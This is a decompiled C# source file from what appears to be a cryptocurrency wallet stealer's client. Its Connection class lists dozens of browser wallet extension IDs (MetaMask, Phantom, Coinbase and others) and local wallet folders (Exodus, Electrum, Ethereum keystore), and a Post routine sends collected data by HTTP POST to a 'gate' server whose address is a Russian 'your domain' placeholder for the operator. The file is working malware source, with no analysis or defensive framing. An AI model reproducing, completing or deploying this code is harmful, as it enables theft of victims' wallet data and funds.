using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;

namespace client.Network
{
	// Token: 0x02000005 RID: 5
	internal class Connection
	{
		// Token: 0x06000007 RID: 7 RVA: 0x000021B0 File Offset: 0x000003B0
		public static void Initialize()
		{
			List<string> list = "BitAppWallet,\\fihkakfobkmkjojpchpfgcmhfjnmnfpi;BinanceChain,\\fhbohimaelbohpjbbldcngcnapndodjp;BraveWallet,\\odbfpeeihdkbihmopkbjmoonfanlbfcl;Coinbase,\\hnfanknocfeofbddgcijnmhnfnkdnaad;EqualWallet,\\blnieiiffboillknjnepogjhkgnoapac;iWallet,\\kncchdigobghenbbaddojjnnaogfppfj;MathWallet,\\afbcbjpbpfadlkmhmclhkeeodmamcflc;MetaMask,\\nkbihfbeogaeaoehlefnkodbefgpgknn;NiftyWallet,\\jbdaocneiiinmjbjlgalhcelgbejmnid;TronLink,\\ibnejdfjmmkpcnlpebklmnkoeoihofec;Wombat,\\amkmjjmmflddogmhpjloimipbofnfjih;Coin98Wallet,\\aeachknmefphepccionboohckonoeemg;Phantom,\\bfnaelmomeimhlpmgjnjophhpkkoljpa;Mobox,\\fcckkdbjnoikooededlapcalpionmalo;XDCPay,\\bocpokimicclpaiekenaeelehdjllofo;BitApp,\\fihkakfobkmkjojpchpfgcmhfjnmnfpi;GuildWallet,\\nanjmdknhkinifnkgdcggcfnhdaammmj;ICONex,\\flpiciilemghbmfalicajoolhkkenfel;copay,\\cnidaodnidkbaplmghlelgikaiejfhja;Oxygen,\\fhilaheimglignddkjgofkcbgekhenbh;YoroiWallet,\\ffnbelfdoeiohenkjibnmadjiehjhajb;GuardaWallet,\\hpglfhgfnhbgpjdenjgmdgoeiappafln;JaxxLiberty,\\cjelfplplebdjjenllpjcblmjkfcffne;AtomicWallet,\\fhilaheimglignddkjgofkcbgekhenbh;MewCx,\\nlbmnnijcnlegkjjpcfjclmcfggfefdm;SaturnWallet,\\nkddgncdjgjfcddamfgcmfnlhccnimig;RoninWallet,\\fnjhmkhhmkbjkkabndcnnogagogbneec;TerraStation,\\aiifbnbfobpmeekipheeijimdpnlpgpp;HarmonyWallet,\\fnnegphlobjdpkhecapkijjdkgcjhkib;TonCrystal,\\cgeeodpfagjceefieflmdfphplkenlfk;KardiaChain,\\pdadjkfkgcafgbceimcpbkalnfnepbnk;PaliWallet,\\mgffkfbidihjpoaomajlbgchddlicgpn;BoltX,\\aodkkagnadcbobfpggfnjeongemjbjca;LiqualityWallet,\\kpfopkelmapcoipemfendmdcghnegimn;XdefiWallet,\\hmeobnfnfcmdkdcmlblgagmfpfboieaf;NamiWallet,\\lpfcbjknijpeeillifnkikgncikgfhdo;MaiarDeFiWallet,\\dngmlblcodfobpdpecaadgfbcggfjfnm;Authenticator,\\bhghoamapcdpbohphigoooaddinpkbai;TempleWallet,\\ookjlbkiijinhpmnjffcofjonbfbgaoc;".Split(new char[]
			{
				';'
			}).ToList<string>();
			list.RemoveAll((string y) => string.IsNullOrEmpty(y));
			list.ForEach(delegate(string x)
			{
				Connection.exts.Add(x.Split(new char[]
				{
					','
				})[0], x.Split(new char[]
				{
					','
				})[1]);
			});
			List<string> list2 = "Armory,\\Armory;AtomicWallet,\\atomic\\Local Storage\\leveldb;Bytecoin,\\bytecoin;Coinomi,\\Coinomi\\Coinomi\\wallets;Exodus,\\Exodus\\exodus.wallet;Ethereum,\\Ethereum\\keystore;Electrum,\\Electrum\\wallets;Guarda,\\Guarda\\Local Storage\\leveldb;Jaxx,\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb;Zcash,\\Zcash".Split(new char[]
			{
				';'
			}).ToList<string>();
			list2.RemoveAll((string y) => string.IsNullOrEmpty(y));
			list2.ForEach(delegate(string x)
			{
				Connection.wllts.Add(x.Split(new char[]
				{
					','
				})[0], x.Split(new char[]
				{
					','
				})[1]);
			});
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002288 File Offset: 0x00000488
		public static string Post(string action, byte[] data)
		{
			WebRequest webRequest = WebRequest.Create(Connection.gate + action);
			webRequest.Method = "POST";
			webRequest.ContentType = "application/x-www-form-urlencoded";
			webRequest.ContentLength = (long)data.Length;
			using (Stream requestStream = webRequest.GetRequestStream())
			{
				requestStream.Write(data, 0, data.Length);
			}
			string result;
			using (WebResponse response = webRequest.GetResponse())
			{
				using (Stream responseStream = response.GetResponseStream())
				{
					using (StreamReader streamReader = new StreamReader(responseStream))
					{
						result = streamReader.ReadToEnd();
					}
				}
			}
			return result;
		}

		// Token: 0x0400000A RID: 10
		public static Dictionary<string, string> wllts = new Dictionary<string, string>();

		// Token: 0x0400000B RID: 11
		public static Dictionary<string, string> exts = new Dictionary<string, string>();

		// Token: 0x0400000C RID: 12
		private static string gate = "https://*Ваш домен*/";
	}
}
